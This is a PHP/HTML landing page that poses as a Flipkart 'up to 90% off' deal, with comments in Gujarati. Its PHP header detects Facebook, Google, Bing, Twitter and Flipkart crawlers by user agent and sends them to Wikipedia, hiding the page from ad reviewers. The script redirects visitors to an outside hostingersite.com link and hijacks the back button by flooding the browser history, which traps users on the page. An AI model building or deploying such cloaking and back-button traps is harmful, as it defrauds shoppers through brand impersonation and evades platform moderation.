<?php
// --- BOT PROTECTION LOGIC ---
function is_bot() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    // Bots and Crawlers list
    if (preg_match('/(facebookexternalhit|Facebot|Googlebot|Flipkart|AdsBot-Google|Bingbot|Twitterbot)/i', $ua)) {
        return true;
    }
    return false;
}

// Jo bot hoy to Wikipedia par moklo
if (is_bot()) {
    header("Location: https://www.wikipedia.org");
    exit;
}
?>
<!DOCTYPE html>
<html lang="gu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Claim Your Deal</title>
    <style>
        body, html {
            height: 100%; margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            background-color: #2874f0; font-family: 'Roboto', sans-serif;
        }

        /* --- Floating Logos --- */
        @keyframes float {
            0% { transform: translate(0, 0) rotate(0deg); }
            50% { transform: translate(100px, 100px) rotate(180deg); }
            100% { transform: translate(0, 0) rotate(360deg); }
        }
        .floating-logo {
            position: absolute; width: 60px; opacity: 0.12; z-index: 1; pointer-events: none;
        }

        /* --- Button & Container --- */
        .container { text-align: center; z-index: 10; position: relative; width: 100%; }
        .deal-text { font-size: 22px; font-weight: bold; color: #ffffff; margin-bottom: 20px; text-transform: uppercase; }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            50% { transform: translateX(4px); }
            75% { transform: translateX(-4px); }
        }

        .oval-button {
            background-color: #ffe11b; color: #212121;
            padding: 15px 55px; font-weight: bold; border: none;
            border-radius: 50px; cursor: pointer;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            animation: shake 0.5s infinite; display: inline-block;
            text-align: center; text-decoration: none;
        }

        .offer-text { font-size: 26px; display: block; line-height: 1.2; }
        .click-Here-text { font-size: 14px; display: block; margin-top: 4px; font-weight: normal; color: #333; }

        button:active { transform: scale(0.95); }
    </style>
</head>
<body onclick="activateHijack()">

    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:10%; left:10%; animation: float 15s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:70%; left:15%; animation: float 20s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:40%; left:80%; animation: float 18s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:80%; left:60%; animation: float 25s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:20%; left:50%; animation: float 12s infinite linear;">
    <img src="https://seeklogo.com/images/F/flipkart-logo-3F33927DAA-seeklogo.com.png" class="floating-logo" style="top:50%; left:30%; animation: float 22s infinite linear;">

    <div class="container">
        <div class="deal-text">Claim your deal</div>
        <div class="oval-button" onclick="redirectNow()">
            <span class="offer-text">UP To 90% Off</span>
            <span class="click-Here-text">Click Here</span>
        </div>
    </div>

    <script>
        var targetUrl = "https://green-mantis-164394.hostingersite.com/"; // Tamari final link ahi muko

        function redirectNow() {
            window.location.replace(targetUrl);
        }

        // --- BACK BUTTON REDIRECT TRICK ---
        function activateHijack() {
            // History loop banavo
            for(var i=0; i<10; i++) {
                window.history.pushState(null, null, window.location.href);
            }
        }

        window.onload = function() {
            // Initial history push
            window.history.pushState(null, null, window.location.href);
            
            // Jyare pan user back dabave
            window.onpopstate = function(event) {
                // Fari history push karo jethi te tya j rahe
                window.history.pushState(null, null, window.location.href);
                // Ane sidhu redirect karo
                window.location.replace(targetUrl);
            };
        };

        // Screen par kyay pan touch thase to redirect active thai jase
        document.body.addEventListener('touchstart', activateHijack);
        document.body.addEventListener('click', activateHijack);
    </script>
</body>
</html>